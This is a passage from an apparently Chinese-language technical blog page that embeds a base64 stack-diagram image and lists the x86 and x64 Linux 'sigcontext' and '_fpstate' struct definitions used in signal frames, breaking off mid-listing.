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7yUV9fYms8rP57GgsO1OPTQAm6d9CArNBOv1VM4FpG4cLhMzmtfeX3hygeZjB+ezJN9G+Fub6bJiKEpvDPKxei2xvFl21JS7Ew6L5lnKrVpMxv6DdMgqb2b53+QxO1ZtpiXkI9xJNq4eKCbG9KrOcAwGTE8hReHOrkg3SS1+nttRDAZOiSJaZ2qhuBOPRJ45Ax9PACEQiFeeeUV+vTpw6xZs/D5NKZYb+WbeOvp1/hkdSG1vzDhZ8dnzzDlnHO55Z1d9Zok59v2Mv95/vW8sKr6+5fv/uxRfnjuJOZ8W+eCZmmBDBpvbXURaUHGjx/PggULjj9eP7ULlq8ByhCCIfIPBckvszjsCVHs/64etluajSEZtloGvYZmsWdTKZcsOzHc2mdoCn8909Zoo8lBf5DcfUE2F4coCoDdbpCWZJLTzk7flKrrMDcYy6Jgv5/lB0OUGAZZHRyMbG/WfY3nZqDLDY+TfuEUABYvXszYsWPr/Bo5OTk8/PDDTJo0qaG717q40ulz9nCGDDqD7KxMunVqR5ukJNwO8Jcf5eCenWxZv4J//eMz1uz2VJ2XUEUKo1/eyuIpHSptX889fYfw+GYfmCmccfE1TL50OP26pmHzHqFwyyr+Ne9dPvpmv0op5DjVHItIfNlMenYw6Xm62w2F+GK9j4ruTr7f1owKnyFvkDdzI+sQDHLaNm6Zhc1hY1A3G4MasY2YDINuHZ1MqqkOU47bsmWLgnFD8B5i8/KP2Lz8o9PXZqiEbz9+kRkfv3j62pRmSeFYRFopi/xtHh5f5SGljY3B6TY6uQBfiHUFATZFDiO57ExQDa6ISKugcCwirV5JcZAlxdXNfDMYc66bc12ntUsiIhInCsciUi/OjCwsXzNeDDTkp1fWdjqsK2d/NbnYTE7ihjHduLOfu+aJg9IsODOy4t0FEWkGFI5FpF76PPhlvLtwyvoCtwaOkrdiOWvyd7N33wGKfA7adOjOGeeMYuTAzri1aIOISKuicCwirZs9jewRl5I9It4dERGRpkBjIiIiIiIiYVrnWERqJTU1ld69e8e7GyINorS0lE2bNsW7G9JgTBI79iSznTP6rpehCvbmb+eIFjGWOlA4FhEREREJU1mFiIiIiEiYwrGIiIiISJjCsYiIiIhImMKxiIiIiEiYwrGIiIiISJjCsYiIiIhImMKxiIiIiEiYwrGIiIiISJjCsYiIiIhImMKxiIiIiEiYwrGIiIiISJjCsYiIiIhImMKxiIiIiEiYwrGIiIiISJjCsYiIiIhImMKxiIiIiEiYwrGIiIiISJjCsYiIiIhImMKxiIiIiEiYwrGIiIiISJjCsYiIiIhImMKxiIiIiEiYwrGIiIiISJjCsYiIiIhImMKxiIiIiEiYwrGIiIiISJjCsYiIiIhImMKxiIiIiEiYwrGIiIiISJjCsYiIiIhImMKxiIiIiEiYwrGIiIiISJjCsYiIiIhImMKxiIiIiEiYwrGIiIiISJjCsYiIiIhImMKxiIiIiEiYwrGIiIiISJjCsYiIiIhI2P8HCKTXCfFRUFoAAAAASUVORK5CYII=\" alt=\"signal2-stack\"></p>\n<p>对于signal Frame来说，不同会因为架构的不同而因此有所区别，这里给出分别给出x86以及x64的sigcontext</p>\n<p>x86</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sigcontext</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">short</span> gs, __gsh;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">short</span> fs, __fsh;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">short</span> es, __esh;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">short</span> ds, __dsh;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> edi;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> esi;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> ebp;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> esp;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> ebx;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> edx;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> ecx;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> eax;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> trapno;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> err;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> eip;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">short</span> cs, __csh;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> eflags;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> esp_at_signal;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">short</span> ss, __ssh;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">fpstate</span> * <span class=\"title\">fpstate</span>;</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> oldmask;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> cr2;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>x64</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">fpstate</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"comment\">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">__uint16_t</span>        cwd;</span><br><span class=\"line\">  <span class=\"keyword\">__uint16_t</span>        swd;</span><br><span class=\"line\">  <span class=\"keyword\">__uint16_t</span>        ftw;</span><br><span class=\"line\">  <span class=\"keyword\">__uint16_t</span>        fop;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span>        rip;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span>        rdp;</span><br><span class=\"line\">  <span class=\"keyword\">__uint32_t</span>        mxcsr;</span><br><span class=\"line\">  <span class=\"keyword\">__uint32_t</span>        mxcr_mask;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">fpxreg</span>    _<span class=\"title\">st</span>[8];</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">xmmreg</span>    _<span class=\"title\">xmm</span>[16];</span></span><br><span class=\"line\">  <span class=\"keyword\">__uint32_t</span>        padding[<span class=\"number\">24</span>];</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sigcontext</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> 